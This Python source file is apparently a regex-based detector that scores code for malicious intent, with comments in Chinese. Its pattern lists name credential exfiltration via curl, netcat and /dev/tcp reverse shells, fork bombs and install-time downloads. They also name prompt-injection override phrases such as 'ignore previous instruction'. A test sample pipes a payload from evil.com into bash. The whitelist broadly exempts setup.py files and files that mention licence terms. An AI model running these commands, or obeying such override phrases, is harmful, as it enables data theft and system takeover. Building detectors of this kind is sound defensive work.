#!/usr/bin/env python3
"""
🛡️ Enhanced Intent Detector V2 - 增强版意图识别器
基于行为上下文分析代码的真实意图，大幅降低误报率

核心增强:
1. 多层意图分析 (语法 + 语义 + 上下文)
2. 白名单机制 (常见良性模式豁免)
3. 风险评分系统 (0-10 分)
4. AI 特定意图识别 (LLM/Agent 相关)
"""

import re
import json
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path

class IntentType(Enum):
    """意图类型"""
    MALICIOUS = "malicious"      # 恶意意图
    SUSPICIOUS = "suspicious"    # 可疑意图 (需要人工审查)
    BENIGN = "benign"           # 正常意图
    UNKNOWN = "unknown"         # 未知意图

@dataclass
class IntentAnalysis:
    """意图分析结果"""
    intent: IntentType
    confidence: float  # 0.0-1.0
    reasons: List[str]
    risk_score: float  # 0.0-10.0
    matched_patterns: List[str] = field(default_factory=list)
    whitelisted: bool = False
    whitelist_reason: str = ""
    
    def to_dict(self) -> Dict:
        return {
            'intent': self.intent.value,
            'confidence': self.confidence,
            'risk_score': self.risk_score,
            'reasons': self.reasons,
            'matched_patterns': self.matched_patterns,
            'whitelisted': self.whitelisted,
            'whitelist_reason': self.whitelist_reason
        }

class EnhancedIntentDetector:
    """
    增强版意图检测器
    
    检测等级:
    - malicious: 明确恶意
    - suspicious: 可疑 (需要进一步检测)
    - unclear: 不确定 (建议 LLM 判定)
    - benign: 良性
    """
    """增强版意图检测器"""
    
    def __init__(self):
        # 恶意意图特征 (增强版)
        self.malicious_patterns = {
            "data_exfiltration": [
                (r"curl.*-d.*http://attacker", "外传到攻击者服务器", 9.5),
                (r"curl.*collect|exfil|steal|leak", "明确的外传意图", 9.0),
                (r"webhook.*discord\.com|telegram\.org", "使用即时通讯外传", 8.5),
                (r"socket.*connect.*\d+\.\d+\.\d+\.\d+", "直接 IP 连接外传", 9.0),
                (r"base64.*curl|wget", "编码后外传", 8.5),
                (r"/etc/passwd|shadow.*curl", "敏感文件外传", 9.5),
                (r"\.aws/credentials.*curl", "AWS 凭证外传", 9.5),
                (r"\.ssh/id_rsa.*curl", "SSH 密钥外传", 9.5),
            ],
            "credential_theft": [
                (r"id_rsa.*curl|wget|send", "SSH 密钥外传", 9.5),
                (r"AWS_.*POST|send|exfil", "AWS 凭证外传", 9.5),
                (r"password.*writeFile|send", "密码写入/发送", 9.0),
                (r"process\.env.*curl|wget", "环境变量外传", 8.5),
                (r"\.git-credentials.*cat|send", "Git 凭证窃取", 9.0),
                (r"\.docker/config\.json.*send", "Docker 凭证窃取", 8.5),
                (r"keyring.*get_password.*send", "系统密钥窃取", 8.5),
            ],
            "remote_code_execution": [
                (r"curl.*evil\.com|malicious|hack", "从恶意域名下载", 9.5),
                (r"wget.*payload|backdoor|shell", "下载后门/Shell", 9.5),
                (r"bash.*-c.*curl\|.*bash|wget", "管道执行远程代码", 9.5),
                (r"eval.*atob|base64", "Base64 编码执行", 9.0),
                (r"exec.*curl.*\|.*sh", "远程代码管道执行", 9.5),
                (r"nc.*-e.*/bin/(ba)?sh", "Netcat 反向 Shell", 10.0),
                (r"/dev/tcp/.*0<&196", "/dev/tcp 反向 Shell", 10.0),
            ],
            "persistence": [
                (r"systemd.*malicious|backdoor|persist", "恶意 systemd 服务", 9.0),
                (r"crontab.*curl.*\|.*bash", "定时下载执行", 9.5),
                (r"\.bashrc.*curl.*bash", "Bashrc 后门", 9.0),
                (r"init\.d.*reverse|shell", "Init 脚本后门", 9.0),
                (r"authorized_keys.*echo.*ssh-rsa", "SSH 公钥持久化", 8.5),
            ],
            "supply_chain": [
                (r"postinstall.*curl|wget", "安装时下载", 9.0),
                (r"setup\.py.*exec|eval", "setup.py 恶意执行", 9.0),
                (r"package\.json.*postinstall.*bash", "NPM 后安装脚本", 8.5),
                (r"requirement.*pip.*install.*http", "从 HTTP 安装依赖", 8.0),
            ],
            "prompt_injection": [
                (r"ignore.*previous.*instruction", "忽略之前指令", 8.5),
                (r"system.*prompt.*override|bypass", "系统提示覆盖", 9.0),
                (r"zero.?width.*inject", "零宽字符注入", 9.0),
                (r"developer.*mode.*unfiltered", "开发者模式绕过", 8.5),
                (r"output.*as.*markdown.*code.*block", "Markdown 代码块输出", 7.5),
            ],
            "evasion": [
                (r"eval\(.*atob\(|base64", "Base64 混淆执行", 9.0),
                (r"exec\(.*chr\(\d+\)", "字符编码混淆", 9.0),
                (r"__import__.*importlib", "动态导入绕过", 8.0),
                (r"compile\(\).*exec", "编译后执行", 8.5),
                (r"obfuscate|obfus", "明确标注混淆", 8.0),
            ],
            "resource_exhaustion": [
                (r"while.*true.*:.*fork", "Fork 炸弹", 9.5),
                (r":\(\)\{.*\|:.*&.*\}", "Bash Fork 炸弹", 10.0),
                (r"infinite.*loop|forever", "无限循环", 8.0),
                (r"retry.*max.*99999", "过度重试", 7.5),
            ],
        }
        
        # 良性意图特征 (增强版)
        self.benign_patterns = {
            "devops_normal": [
                (r"curl.*github\.com.*release", "从 GitHub 下载发布版", 9.0),
                (r"wget.*release|download.*\.tar\.gz", "下载压缩发布版", 8.5),
                (r"pip install|npm install|go get", "标准包管理器", 9.5),
                (r"docker pull|docker run", "Docker 正常操作", 9.0),
                (r"kubectl apply|kubectl create", "K8s 正常操作", 9.0),
                (r"terraform apply|plan", "Terraform 操作", 9.0),
                (r"ansible-playbook", "Ansible 操作", 9.0),
            ],
            "monitoring_normal": [
                (r"logging\.info|logger\.info", "正常日志记录", 9.5),
                (r"metrics.*prometheus|grafana", "监控指标上报", 9.0),
                (r"health.?check|status.*endpoint", "健康检查端点", 9.0),
                (r"telemetry.*send.*metrics", "遥测数据发送", 8.5),
            ],
            "config_normal": [
                (r"json\.dump|yaml\.dump.*config", "配置序列化", 9.5),
                (r"csv\.DictReader|pandas.*read_csv", "数据处理", 9.5),
                (r"requests\.get\(.*api\.", "正常 API 调用", 9.0),
                (r"open\(\).*'r'\).*read\(\)", "正常文件读取", 9.0),
                (r"dotenv.*load_dotenv", "环境变量加载", 9.0),
            ],
            "development_normal": [
                (r"print\(|console\.log", "调试输出", 9.5),
                (r"assert\(|pytest|unittest", "单元测试", 9.5),
                (r"def test_|it\('test", "测试定义", 9.5),
                (r"import.*typing|dataclasses", "标准库导入", 9.5),
            ],
            "data_processing": [
                (r"json\.load.*open", "JSON 数据处理", 9.5),
                (r"pandas.*DataFrame", "Pandas 数据处理", 9.5),
                (r"numpy.*array", "Numpy 数值计算", 9.5),
                (r"scikit.*learn|sklearn", "机器学习", 9.0),
            ],
        }
        
        # 白名单 (完全豁免)
        self.whitelist = {
            "file_patterns": [
                r"test_.*\.py",           # 测试文件
                r".*_test\.go",           # Go 测试
                r"setup\.py",             # Python 安装脚本 (除非有恶意特征)
                r"Dockerfile",            # Docker 构建
                r"\.github/workflows/.*", # GitHub Actions
            ],
            "code_patterns": [
                r"^#!/usr/bin/env python3\s*\n#.*normal|benign|test",  # 标注为正常的脚本
                r"#.*Copyright.*Apache|MIT|BSD",  # 开源许可证
                r'"""Usage:.*python.*test',  # 测试用途文档
            ],
            "function_names": [
                r"def test_",              # 测试函数
                r"def setup_",             # 设置函数
                r"def teardown_",          # 清理函数
                r"def main\(\):",          # 主函数
                r"if __name__ == .__main__.:",  # Python 主入口
            ],
        }
        
        # 上下文权重
        self.context_weights = {
            "has_shebang": 0.5,           # 有 Shebang 降低风险
            "has_license": 0.5,          # 有许可证降低风险
            "has_docstring": 0.3,        # 有文档降低风险
            "short_code": 0.5,           # 短代码降低风险 (<50 行)
            "common_imports": 0.3,       # 常见导入降低风险
        }
    
    def check_whitelist(self, code: str, file_path: str = "") -> Tuple[bool, str]:
        """检查是否在白名单中"""
        reasons = []
        
        # 文件模式白名单
        if file_path:
            for pattern in self.whitelist['file_patterns']:
                if re.search(pattern, file_path, re.IGNORECASE):
                    return True, f"文件匹配白名单：{pattern}"
        
        # 代码模式白名单
        for pattern in self.whitelist['code_patterns']:
            if re.search(pattern, code, re.IGNORECASE | re.MULTILINE):
                return True, f"代码匹配白名单：{pattern}"
        
        # 函数名白名单
        for pattern in self.whitelist['function_names']:
            if re.search(pattern, code, re.IGNORECASE):
                reasons.append(f"包含良性函数模式：{pattern}")
        
        if len(reasons) >= 2:  # 多个良性特征 → 白名单
            return True, "多个良性函数特征"
        
        return False, ""
    
    def analyze(self, code: str, yara_matches: List[str] = None, 
                file_path: str = "") -> IntentAnalysis:
        """
        分析代码意图
        
        Args:
            code: 代码内容
            yara_matches: YARA 规则匹配列表
            file_path: 文件路径 (可选)
        
        Returns:
            IntentAnalysis: 意图分析结果
        """
        reasons = []
        matched_patterns = []
        malicious_score = 0.0
        benign_score = 0.0
        
        # 1. 白名单检查
        whitelisted, whitelist_reason = self.check_whitelist(code, file_path)
        if whitelisted:
            return IntentAnalysis(
                intent=IntentType.BENIGN,
                confidence=0.95,
                reasons=[whitelist_reason],
                risk_score=0.5,
                whitelisted=True,
                whitelist_reason=whitelist_reason
            )
        
        # 2. 恶意模式检测
        for category, patterns in self.malicious_patterns.items():
            for pattern, description, risk in patterns:
                if re.search(pattern, code, re.IGNORECASE):
                    malicious_score += risk * 0.1
                    matched_patterns.append(f"{category}: {description}")
                    reasons.append(f"🔴 {description} (风险：{risk})")
        
        # 3. 良性模式检测
        for category, patterns in self.benign_patterns.items():
            for pattern, description, confidence in patterns:
                if re.search(pattern, code, re.IGNORECASE):
                    benign_score += confidence * 0.1
                    reasons.append(f"🟢 {description} (置信：{confidence})")
        
        # 4. 上下文分析
        if "#!/usr/bin/env" in code:
            benign_score += self.context_weights['has_shebang']
            reasons.append("✅ 有 Shebang 声明")
        
        if "Copyright" in code or "License" in code:
            benign_score += self.context_weights['has_license']
            reasons.append("✅ 有许可证信息")
        
        if '"""' in code or "'''" in code or "//" in code:
            benign_score += self.context_weights['has_docstring']
            reasons.append("✅ 有文档注释")
        
        if len(code.split('\n')) < 50:
            benign_score += self.context_weights['short_code']
            reasons.append("✅ 短代码 (<50 行)")
        
        # 5. YARA 匹配权重
        if yara_matches:
            for match in yara_matches:
                if "Malicious" in match or "Attack" in match:
                    malicious_score += 1.0
                elif "Benign" in match or "Normal" in match:
                    benign_score += 1.0
        
        # 5. 综合评分 (修复版)
        # 恶意分数是累加的，良性分数也是累加的
        # 最终风险 = 恶意分数 - 良性分数，但不能让良性完全抵消恶意
        
        # 计算净分数，但恶意分数权重更高
        net_score = malicious_score - (benign_score * 0.3)  # 良性只抵消 30%
        
        # 确保至少有恶意分数的一定比例
        if malicious_score > 0:
            min_risk = malicious_score * 0.5  # 至少保留 50% 的恶意分数
            risk_score = max(min_risk, net_score)
        else:
            risk_score = max(0.0, net_score)
        
        risk_score = min(10.0, max(0.0, risk_score))
        
        # 7. 确定意图类型
        if risk_score >= 7.0:
            intent = IntentType.MALICIOUS
            confidence = min(1.0, 0.7 + (risk_score - 7.0) * 0.1)
        elif risk_score >= 4.0:
            intent = IntentType.SUSPICIOUS
            confidence = 0.5 + (risk_score - 4.0) * 0.1
        else:
            intent = IntentType.BENIGN
            confidence = min(1.0, 0.8 - risk_score * 0.1)
        
        return IntentAnalysis(
            intent=intent,
            confidence=confidence,
            reasons=reasons,
            risk_score=risk_score,
            matched_patterns=matched_patterns,
            whitelisted=False
        )
    
    def batch_analyze(self, samples: List[Dict]) -> Dict:
        """
        批量分析样本
        
        Args:
            samples: 样本列表，每项包含 {'code': str, 'yara_matches': List, 'file_path': str}
        
        Returns:
            统计结果
        """
        results = {
            'total': len(samples),
            'malicious': 0,
            'suspicious': 0,
            'benign': 0,
            'unknown': 0,
            'whitelisted': 0,
            'avg_risk_score': 0.0,
            'risk_distribution': {'low': 0, 'medium': 0, 'high': 0}
        }
        
        total_risk = 0.0
        
        for sample in samples:
            analysis = self.analyze(
                code=sample.get('code', ''),
                yara_matches=sample.get('yara_matches', []),
                file_path=sample.get('file_path', '')
            )
            
            total_risk += analysis.risk_score
            
            if analysis.whitelisted:
                results['whitelisted'] += 1
            
            if analysis.intent == IntentType.MALICIOUS:
                results['malicious'] += 1
                results['risk_distribution']['high'] += 1
            elif analysis.intent == IntentType.SUSPICIOUS:
                results['suspicious'] += 1
                results['risk_distribution']['medium'] += 1
            elif analysis.intent == IntentType.BENIGN:
                results['benign'] += 1
                results['risk_distribution']['low'] += 1
            else:
                results['unknown'] += 1
        
        results['avg_risk_score'] = total_risk / len(samples) if samples else 0.0
        
        return results


# 便捷函数
def analyze_intent(code: str, yara_matches: List[str] = None, 
                   file_path: str = "") -> IntentAnalysis:
    """便捷函数：分析单个代码片段的意图"""
    detector = EnhancedIntentDetector()
    return detector.analyze(code, yara_matches, file_path)


if __name__ == '__main__':
    # 测试示例
    detector = EnhancedIntentDetector()
    
    # 测试恶意样本
    malicious_code = """
    # 恶意下载执行
    import subprocess
    subprocess.run(['curl', 'http://evil.com/payload.sh', '|', 'bash'])
    """
    
    result = detector.analyze(malicious_code)
    print(f"恶意样本分析: {result.intent.value} (风险：{result.risk_score})")
    
    # 测试良性样本
    benign_code = """
    #!/usr/bin/env python3
    # Copyright 2026 MIT License
    import json
    import logging
    
    def main():
        logging.info("Starting application")
        with open('config.json', 'r') as f:
            config = json.load(f)
        print(f"Config loaded: {config}")
    """
    
    result = detector.analyze(benign_code)
    print(f"良性样本分析：{result.intent.value} (风险：{result.risk_score})")
